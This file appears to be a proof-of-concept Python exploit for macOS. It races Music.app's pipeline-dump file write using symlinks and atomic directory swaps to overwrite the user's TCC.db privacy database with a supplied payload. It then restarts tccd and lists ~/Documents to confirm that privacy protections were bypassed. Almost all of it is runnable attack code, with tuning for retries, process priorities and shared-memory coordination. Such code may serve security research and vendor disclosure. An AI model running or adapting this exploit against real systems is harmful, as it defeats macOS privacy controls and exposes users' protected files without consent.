#!/usr/bin/python3

import sys
import shutil
import os
import time
import subprocess
import signal
import ctypes
import multiprocessing.shared_memory

from datetime import datetime as dt, timedelta as td


# Use this to not touch TCC at all.
BENCHMARK = False
#BENCHMARK = True

WRITEABLE_DIR = os.path.join(os.getcwd(), "tmpdir")
if BENCHMARK:
	DST_DIR = os.path.join(os.getcwd(), "benchmark")
else:
	DST_DIR = "/Users/{}/Library/Application Support/com.apple.TCC/".format(os.environ.get("USER"))
DST_FILENAME = "TCC.db"
PAYLOAD_FILE = os.path.join(os.getcwd(), "TCC.db")

N_TRIES = 100
N_DIR_SWAP = 1000
WATCHDOG_TIMEOUT = 3
# currently for the VM demo this is not used
NUM_FILLER = 0		# corenum - 2 (corenum does not include efficiency cores)
FILLER_NICENESS = 10
TARGET_NICENESS = 19

DEBUG = True
tmp = os.environ.get("DEBUG", False)
if tmp == "0":
	DEBUG = False


# START renameatx_np
libc = ctypes.CDLL(None, use_errno=True)

AT_FDCWD = 0xfffffffe
RENAME_SWAP = 0x00000002

renameatx_np = libc.renameatx_np
renameatx_np.restype = ctypes.c_int
renameatx_np.argtypes = [
	ctypes.c_int,
	ctypes.c_char_p,
	ctypes.c_int,
	ctypes.c_char_p,
	ctypes.c_uint,
]
# END

# START SHM
shm = multiprocessing.shared_memory.SharedMemory(create=True, size=4096)
# END

class TimeoutError(Exception): pass


def atomic_rename(src, dst):
	src_c = ctypes.c_char_p(src.encode())
	dst_c = ctypes.c_char_p(dst.encode())

	ret = renameatx_np(AT_FDCWD, src_c, AT_FDCWD, dst_c, RENAME_SWAP)
	if ret != 0:
		print("RENAME ERROR", ret)
		raise RuntimeError("ERROR")

def watchdog(timeout):
	pid = os.fork()
	if pid != 0:
		return pid

	while shm.buf[0] < 1:
		time.sleep(0.1)

	time.sleep(timeout)
	if shm.buf[0] != 3:
		if DEBUG:
			print("[+] Watchdog triggered!")
		shm.buf[0] = 255
	shm.close()
	exit(0)


def switcher(xdir, ydir, tmpdir, monitorfile):
	pid = os.fork()
	if pid != 0:
		return pid

	os.chdir(tmpdir)

	seen = set()
	bad = set(["TCC.db"])

	### child
	while shm.buf[0] == 0:
		pass

	f = None
	last = None
	while shm.buf[0] == 1 and last is None:
		for i in os.scandir("."):
			name = i.name
			if name in bad:
				continue
			if name in seen:
				continue
			if name[0:4] == ".dat":
				seen.add(name)
				if len(seen) == 3:
					done = True
#					print("GOOD", name)
					last = name
					break

	# watchdog got us
#	if last is None:
#		exit(0)

	shm.buf[0] = 2

	while os.path.exists(last):
		pass

	for i in range(N_DIR_SWAP):
		try:
			atomic_rename("../" + xdir, "../" + ydir)
		except RuntimeError as exc:
			print(exc)
	
	shm.buf[0] = 3

	shm.close()
	exit(0)


def filler(tmpdir):
	pid = os.fork()
	if pid != 0:
		return pid

	os.nice(FILLER_NICENESS)

	# the only purpose of fillers is to starve the target
	while shm.buf[0] < 3:
		# generate disk I/O to further hinder the target
#		os.listdir(tmpdir)
		pass

	shm.close()
	exit(0)


def set_sigabort():
	# NOTE: we could also set the taskpolicy here to throttle...
	signal.signal(signal.SIGABRT, signal.SIG_IGN)


def readout(fobj, readsize):
	while True:
		buf = fobj.read(readsize)
		yield buf


def exploit(trynum, tmpdir, xdir, ydir, payload_data):


	# run child process (switcher)
	monitorfile = os.path.join(DST_DIR, DST_FILENAME)

	try:
		start_inode = os.stat(monitorfile).st_ino
	except FileNotFoundError:
		start_inode = None

	# init shm
	shm.buf[0] = 0x00

	# init switcher and watchdog
	child_pids = []
	switcher_pid = switcher(xdir, ydir, tmpdir, monitorfile)
#	watchdog_pid = watchdog(WATCHDOG_TIMEOUT)
	child_pids.append(switcher_pid)
#	child_pids.append(watchdog_pid)

	# init fillers
	for i in range(NUM_FILLER):
		pid = filler(tmpdir)
		child_pids.append(pid)

	# run child process
	# NOTE: The child will try to write to xdir and is affected by switcher
	env = os.environ.copy()
	env_k = "MTL_DUMP_PIPELINES_TO_JSON_FILE"
	env_v = os.path.join(WRITEABLE_DIR, xdir, DST_FILENAME)
	env[env_k] = env_v

	# this is crucial, as otherwise Music won't print to stderr enough
	env["OS_ACTIVITY_DT_MODE"] = "enable"
	env["STDBUF"] = "0"
	env["STDBUF1"] = "0"

	# change dir to tmpdir
	os.chdir(tmpdir)

	shm.buf[0] = 0x01

	# TODO: Music window will pop up if it has not been started and minimized
	#       before. We could do this here, but currently it's omitted
	p = subprocess.Popen([
			# slows down Music
			"taskpolicy",
			"-d",
			"throttle",
			"nice",
			"-n",
			"{}".format(TARGET_NICENESS),
			"/System/Applications/Music.app/Contents/MacOS/Music"
		],
		stdout=subprocess.DEVNULL,
		stderr=subprocess.DEVNULL,
#		stderr=subprocess.PIPE,
		env=env,
		preexec_fn=set_sigabort,
	)

	# wait until child signals us
	shm.buf[0] = 1
	while shm.buf[0] < 2:
		pass

	# TODO: if we have the file open and child finishes too early, can we
	#	detect this?

	filename = None
	file = None
	seen = set((x.name for x in os.scandir(".")))
	while shm.buf[0] == 2 and filename is None:
		for i in os.scandir("."):
			name = i.name
			# filter out entries that were there at the start, this
			# way we are guaranteed to get the 4th file.
			if name in seen:
				continue
			if name.startswith(".dat.nosync"):
				filename = name
				break

	# open is done separately from listdir, since the dirs are being switched
	# at this point, it is much less likely that both of them succeed at the
	# same time. Since we only need the name of the file, we can retry open
	# in a loop to be a lot more efficient
	while shm.buf[0] == 2 and file is None:
		try:
			f = open(name, "wb")
		except FileNotFoundError as exc:
			pass
		else:
			file = f
			break

	print("[+] 1/4 OK, status: {}".format(shm.buf[0]))

	if file is None:
		p.kill()
		p.wait()
		for pid in child_pids:
			os.kill(pid, signal.SIGKILL)
		return False

	# NOTE: time.sleep() here ruins the exploit, as the parent thread gets rescheduled!
	while shm.buf[0] < 3:
		pass

	p.kill()
	p.wait()
	for pid in child_pids:
		os.kill(pid, signal.SIGKILL)

	if file is None:
		return False

	if DEBUG:
		print("[+] 2/4 Opened file")
	else:
		print("[+] 2/4 OK")

	opened_ino = os.fstat(file.fileno()).st_ino
#	if DEBUG:
#		print("[?] Opened inode: {}".format(opened_ino))

	# check for success
	curino = None
	try:
		curino = os.stat(monitorfile).st_ino
	except FileNotFoundError:
		pass

#	if DEBUG:
#		print("[?] Current target inode: {}".format(curino))

	if start_inode == curino:
		return False

	if DEBUG:
		print("[+] 3/3 Inode changed: {} -> {}".format(start_inode, curino))
	else:
		print("[+] 3/3 OK")
	if curino != opened_ino:
		return False

	print("[+] 4/4 SUCCESS!")
	print("[+] Writing payload")
	f.seek(0, 0)
	f.truncate(0)
	#f.write(b'hello\n\n')
	#f.write(b'X' * 1337)
	f.write(payload_data)
	f.flush()

	print("[+] Exploit successful in {} tries".format(trynum))

	if BENCHMARK:
		return True

	print("[+] Restarting restarting user tccd...")
	subprocess.check_output(["launchctl", "stop", "com.apple.tccd"])
	subprocess.check_output(["launchctl", "start", "com.apple.tccd"])

	print("[+] Sleeping for 2s")
	time.sleep(2)

	print("[+] Listing ~/Documents")
	dirlist = os.listdir("/Users/{}/Documents".format(os.environ.get("USER")))
	for i in dirlist:
		print("\t", i)

	return True


def cleanup(tmpdir, xdir, ydir):
	shutil.rmtree(WRITEABLE_DIR, ignore_errors=True)

	os.makedirs(WRITEABLE_DIR)
	os.chdir(WRITEABLE_DIR)

	os.makedirs(tmpdir)
	# we use realpath so that resolution is a tad slower for Music
	os.symlink(os.path.realpath(tmpdir), xdir)
	os.symlink(DST_DIR, ydir)

	# create a dummy TCC.db so that Music won't fail an assert()
#	f = open(tmpdir + "/TCC.db", "wb")
#	f.close()


def main():
	# tmpdir is a directory we control
	# xdir is a symlink to tmpdir
	# ydir is a symlink to the target
	tmpdir = "zzz"
	xdir   = "xxx"
	ydir   = "yyy"

	payload_data  = open(PAYLOAD_FILE, "rb").read()
	startdir = os.getcwd()

	if BENCHMARK:
		shutil.rmtree(DST_DIR, ignore_errors=True)
		os.makedirs(DST_DIR)
		f = open(os.path.join(DST_DIR, DST_FILENAME), "w")
		f.close()

	# terminate music as a precaution
	# TODO: maybe don't rely on killall...
	os.system("killall Music 2>/dev/null")

	try:
		for i in range(1, N_TRIES+1):
			print("[+] Try: {}/{}".format(i, N_TRIES))

			# change to the starting dir
			os.chdir(startdir)

			cleanup(tmpdir, xdir, ydir)

			success = exploit(i, tmpdir, xdir, ydir, payload_data)
			if success:
				break
	finally:
		try:
			shm.unlink()
		except FileNotFoundError:
			pass


if __name__ == "__main__":
	main()

